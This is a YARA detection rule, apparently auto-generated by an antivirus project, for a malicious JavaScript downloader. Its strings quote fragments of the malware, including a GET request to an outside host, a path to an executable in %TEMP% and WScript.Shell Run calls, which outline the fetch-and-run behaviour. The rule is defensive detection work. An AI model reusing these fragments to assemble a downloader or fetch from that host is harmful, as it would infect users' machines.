rule sig_20160329_b3e1f29bb92fb989e3166234655d6240 {
  meta:
    description = "datamaliciousorder - file 20160329_b3e1f29bb92fb989e3166234655d6240.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5d86940bd85f3d9ee33449d65fcdcf640e122f3b1331273678dfe15d10bde39e"

  strings:
    $s1  = "C1[C](\"GET\", \"http://hiddenhandbags.com/kdk4a\", false);" fullword ascii
    $s2  = "function Tq() {return d[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"FFVvjsmFjilNfuR.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Ly](AT() * 11); if (C1[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var d = function tQ() {return WScript[M](\"WScript.Shell\");}(), X = 11;" fullword ascii
    $s5  = "function Q(My, T1){Wk = Wk * 1; return My - T1;};" fullword ascii
    $s6  = "function s(){return \"\" + T0;};" fullword ascii
    $s7  = "function iH(ye){d[\"Run\"](ye, Wk, Wk);};" fullword ascii
    $s8  = "function lA() {return ((r == true) && (r == K)) ? 1 : Wk;};" fullword ascii
    $s9  = "var te = new this[\"Date\"]();" fullword ascii
    $s10 = "function TH()" fullword ascii
    $s11 = " while (PZ){" fullword ascii
    $s12 = "function b(){return M;};" fullword ascii
    $s13 = "return Q(ZL, rk);" fullword ascii
    $s14 = "function AT(){return 22;};" fullword ascii
    $s15 = "function qT(C0) {var H = (1, 2, 3, 4, 5, C0); return H;};" fullword ascii
    $s16 = "K = true; " fullword ascii
    $s17 = "var K = false;" fullword ascii
    $s18 = "var f = false;" fullword ascii
    $s19 = "var r = false;" fullword ascii
    $s20 = "r = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}